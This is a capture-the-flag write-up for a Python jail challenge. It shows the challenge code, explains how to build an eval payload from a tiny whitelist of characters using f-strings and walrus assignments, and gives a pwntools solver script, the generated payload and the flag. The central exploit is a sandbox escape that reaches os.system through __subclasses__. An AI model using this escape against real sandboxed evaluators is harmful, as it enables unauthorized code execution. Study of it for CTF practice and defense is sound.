# Avatar [52 Solves]

## Description

> The avatar is imprisoned in an ice jail. Can you help him awaken his powers?
>
> author: hweissi
>
> `nc chall.glacierctf.com 13384`
>
> Attachments: chall.py

chall.py

```python
print("You get one chance to awaken from the ice prison.")
code = input("input: ").strip()
whitelist = """gctf{"*+*(=>:/)*+*"}""" # not the flag
if any([x not in whitelist for x in code]) or len(code) > 40000:
    
    print("Denied!")
    exit(0)

eval(eval(code, {'globals': {}, '__builtins__': {}}, {}), {'globals': {}, '__builtins__': {}}, {})
```

## Flag

gctf{But_wh3n_th3_w0rld_n33d3d_h1m_m0st_h3_sp4wn3d_4_sh3ll}

## Solution

This is Python Jails Escape challenge.

A global function such as `input()` cannot be used because both `globals` and `__builtins__` is set to `{}`.

Checking an available character:

```console
$ echo 'gctf{"*+*(=>:/)*+*"}' | fold -1 | sort -u | tr -d '\n'
"()*+/:=>{}cfgt
```

Since `f` is available, f-string is useful.
`c` is available too so we can generate characters using `f"{97:c}"`.

```python
>>> f"{97:c}"
'a'
```

Numeric characters such as `0` or `1` cannot be used directly.
Instead, numbers can be generated using the equality comparison `()==()` to evaluate to `True` and the arithmetic operation of `+`.

```python
>>> f"{(()=={}):c}"
'\x00'
>>> f"{(()==()):c}"
'\x01'
>>> f"{(()==())+(()==()):c}"
'\x02'
>>> f"{(()==())+(()==())+(()==()):c}"
'\x03'
```

By using variable definitions with f-strings, it is possible to shorten the length of the generated payload.

```python
>>> f"{(null:=(()=={})):c}"
'\x00'
>>> f"{(one:=(()==())):c}"
'\x01'
>>> f"{(two:=(one+one)):c}"
'\x02'
>>> f"{(three:=(one+two)):c}"
'\x03'
```

Using these features, I will generate a payload for Remote Code Execution (RCE) Python code.
I used the following for RCE Python code:

```python
[m for m in  ().__class__.__bases__[0].__subclasses__() if m.__name__ in '_wrap_close'][0].__init__.__globals__['system']('ls -la')
```

The generated payload is expected to take a form like `f"{varia}{ble}{defen}{ition}{RCE}{code}"`.

However, there is a possibility of an error since the variable definition part is interpreted as a number.
For example:

```python
>>> eval(eval('f"{(a:=97)}print(1)"'))
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1
    97print(1)
     ^
SyntaxError: invalid decimal literal
```

In order to fix this issue, setting the multiplication of the variable definition section to 0, then added 9 (`\t`).
By prefixing the payload with \t, I made it possible to execute the second eval.

```python
>>> eval(eval('f"\tprint(1)"'))
1
>>> eval(eval('f"{(tab:=9):c}print(1)"'))
1
>>> eval(eval('f"{(a:=97)*(b:=98)*(null:=0)+(tab:=9):c}print(1)"'))
1
```

### Exploit

solver.py

```python
from pwn import remote, process, context

context.log_level = "ERROR"

MAPPING = {
    0: "c",
    1: "f",
    2: "g",
    3: "t",
    4: "cc",
    5: "cf",
    6: "cg",
    7: "ct",
    8: "fc",
    9: "ff",
    10: "fg",
    11: "ft",
    12: "gc",
}


# prepare 1, 2, ... , 12 and assign it to variables
def variable_definition():
    formulas = f"""
        {MAPPING[0]}  := (()=={{}})
        {MAPPING[1]}  := (()==())
        {MAPPING[2]}  := {MAPPING[1]}  + {MAPPING[1]}
        {MAPPING[3]}  := {MAPPING[2]}  + {MAPPING[1]}
        {MAPPING[4]}  := {MAPPING[3]}  + {MAPPING[1]}
        {MAPPING[5]}  := {MAPPING[4]}  + {MAPPING[1]}
        {MAPPING[6]}  := {MAPPING[5]}  + {MAPPING[1]}
        {MAPPING[7]}  := {MAPPING[6]}  + {MAPPING[1]}
        {MAPPING[8]}  := {MAPPING[7]}  + {MAPPING[1]}
        {MAPPING[9]}  := {MAPPING[8]}  + {MAPPING[1]}
        {MAPPING[10]} := {MAPPING[9]}  + {MAPPING[1]}
        {MAPPING[11]} := {MAPPING[10]} + {MAPPING[1]}
        {MAPPING[12]} := {MAPPING[11]} + {MAPPING[1]}
    """
    formulas = formulas.replace(" ", "").strip().split("\n")

    payload = (
        "{"
        + "*".join([f"({formula})" for formula in formulas])  # multiplying anything by 0 results in 0
        + "+"
        + MAPPING[9]  # \t
        + ":c}"
    )

    return payload


# convert pycode
def rce_pycode(pycode):
    payload = ""
    for c in pycode:
        payload += "{"
        payload += f"{MAPPING[10]}*{MAPPING[ord(c) // 10]}"

        if ord(c) % 10 != 0:
            payload += f"+{MAPPING[ord(c) % 10]}"

        payload += ":c}"

    return payload


def main():
    rcecode = "[m for m in  ().__class__.__bases__[0].__subclasses__() if m.__name__ in '_wrap_close'][0].__init__.__globals__['system']('cat flag.txt')"
    payload = 'f"' + variable_definition() + rce_pycode(rcecode) + '"'

    # assertion
    whitelist = """gctf{"*+*(=>:/)*+*"}"""
    assert all([x in whitelist for x in payload]), "payload is not in whitelist"
    assert len(payload) <= 40000, f"{len(payload)=}"

    # print(payload)

    # io = process("chall.py")
    io = remote("chall.glacierctf.com", 13384)
    io.sendlineafter(b"input:", payload.encode())
    io.interactive("")


if __name__ == "__main__":
    main()
```

generated payload:

```python
f"{(c:=(()=={}))*(f:=(()==()))*(g:=f+f)*(t:=g+f)*(cc:=t+f)*(cf:=cc+f)*(cg:=cf+f)*(ct:=cg+f)*(fc:=ct+f)*(ff:=fc+f)*(fg:=ff+f)*(ft:=fg+f)*(gc:=ft+f)+fg:c}{fg*ff+f:c}{fg*fg+ff:c}{fg*t+g:c}{fg*fg+g:c}{fg*ft+f:c}{fg*ft+cc:c}{fg*t+g:c}{fg*fg+ff:c}{fg*t+g:c}{fg*fg+cf:c}{fg*ft:c}{fg*t+g:c}{fg*t+g:c}{fg*cc:c}{fg*cc+f:c}{fg*cc+cg:c}{fg*ff+cf:c}{fg*ff+cf:c}{fg*ff+ff:c}{fg*fg+fc:c}{fg*ff+ct:c}{fg*ft+cf:c}{fg*ft+cf:c}{fg*ff+cf:c}{fg*ff+cf:c}{fg*cc+cg:c}{fg*ff+cf:c}{fg*ff+cf:c}{fg*ff+fc:c}{fg*ff+ct:c}{fg*ft+cf:c}{fg*fg+f:c}{fg*ft+cf:c}{fg*ff+cf:c}{fg*ff+cf:c}{fg*ff+f:c}{fg*cc+fc:c}{fg*ff+t:c}{fg*cc+cg:c}{fg*ff+cf:c}{fg*ff+cf:c}{fg*ft+cf:c}{fg*ft+ct:c}{fg*ff+fc:c}{fg*ff+ff:c}{fg*fg+fc:c}{fg*ff+ct:c}{fg*ft+cf:c}{fg*ft+cf:c}{fg*fg+f:c}{fg*ft+cf:c}{fg*ff+cf:c}{fg*ff+cf:c}{fg*cc:c}{fg*cc+f:c}{fg*t+g:c}{fg*fg+cf:c}{fg*fg+g:c}{fg*t+g:c}{fg*fg+ff:c}{fg*cc+cg:c}{fg*ff+cf:c}{fg*ff+cf:c}{fg*ft:c}{fg*ff+ct:c}{fg*fg+ff:c}{fg*fg+f:c}{fg*ff+cf:c}{fg*ff+cf:c}{fg*t+g:c}{fg*fg+cf:c}{fg*ft:c}{fg*t+g:c}{fg*t+ff:c}{fg*ff+cf:c}{fg*ft+ff:c}{fg*ft+cc:c}{fg*ff+ct:c}{fg*ft+g:c}{fg*ff+cf:c}{fg*ff+ff:c}{fg*fg+fc:c}{fg*ft+f:c}{fg*ft+cf:c}{fg*fg+f:c}{fg*t+ff:c}{fg*ff+t:c}{fg*ff+f:c}{fg*cc+fc:c}{fg*ff+t:c}{fg*cc+cg:c}{fg*ff+cf:c}{fg*ff+cf:c}{fg*fg+cf:c}{fg*ft:c}{fg*fg+cf:c}{fg*ft+cg:c}{fg*ff+cf:c}{fg*ff+cf:c}{fg*cc+cg:c}{fg*ff+cf:c}{fg*ff+cf:c}{fg*fg+t:c}{fg*fg+fc:c}{fg*ft+f:c}{fg*ff+fc:c}{fg*ff+ct:c}{fg*fg+fc:c}{fg*ft+cf:c}{fg*ff+cf:c}{fg*ff+cf:c}{fg*ff+f:c}{fg*t+ff:c}{fg*ft+cf:c}{fg*gc+f:c}{fg*ft+cf:c}{fg*ft+cg:c}{fg*fg+f:c}{fg*fg+ff:c}{fg*t+ff:c}{fg*ff+t:c}{fg*cc:c}{fg*t+ff:c}{fg*ff+ff:c}{fg*ff+ct:c}{fg*ft+cg:c}{fg*t+g:c}{fg*fg+g:c}{fg*fg+fc:c}{fg*ff+ct:c}{fg*fg+t:c}{fg*cc+cg:c}{fg*ft+cg:c}{fg*gc:c}{fg*ft+cg:c}{fg*t+ff:c}{fg*cc+f:c}"
```

Result:

```console
$ python3 solver.py
 gctf{But_wh3n_th3_w0rld_n33d3d_h1m_m0st_h3_sp4wn3d_4_sh3ll}
```

## References

- [2. Lexical analysis — Python 3.12.0 documentation](https://docs.python.org/3/reference/lexical_analysis.html)
- [The Python Standard Library — Python 3.12.0 documentation](https://docs.python.org/3/library/index.html)
